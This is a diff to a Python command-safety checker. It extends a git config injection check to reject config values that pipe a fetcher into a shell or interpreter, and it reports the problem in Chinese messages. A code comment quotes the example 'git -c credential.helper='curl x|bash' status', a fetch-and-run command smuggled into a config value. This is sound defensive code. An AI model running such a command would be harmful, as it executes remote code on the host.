@@ -606,6 +606,21 @@ def check_git_config_injection(argv):
             inner = value.lstrip()
             if inner.startswith("!"):
                 inner = inner[1:].lstrip()
+            # v1.4.8: also run pipeline-to-shell check on the inner value.
+            # Without this, `git -c credential.helper='curl x|bash' status`
+            # passes per-stage scan (curl alone OK, bash alone OK) but the
+            # combined pipeline is the textbook fetcher-to-shell attack.
+            inner_pipeline = shlex_pipeline_stages(inner)
+            if inner_pipeline and len(inner_pipeline) >= 2:
+                stage_bases = []
+                for s_argv in inner_pipeline:
+                    u = strip_env_assignments_and_wrappers(s_argv)
+                    stage_bases.append(basename(u[0]) if u else "")
+                if stage_bases[-1] in SHELL_BASENAMES | INTERPRETER_BASENAMES:
+                    upstream_all_safe = all(b in SAFE_CMDS for b in stage_bases[:-1])
+                    if not upstream_all_safe:
+                        return (f"git -c {key} 含 pipeline → shell/interpreter "
+                                f"({ ' | '.join(stage_bases) }) — 远程/动态内容直进 shell")
             sub_stages, ok = shlex_split_stages(inner)
             if not ok:
                 return f"git -c {key} 值无法 tokenize — obfuscation"
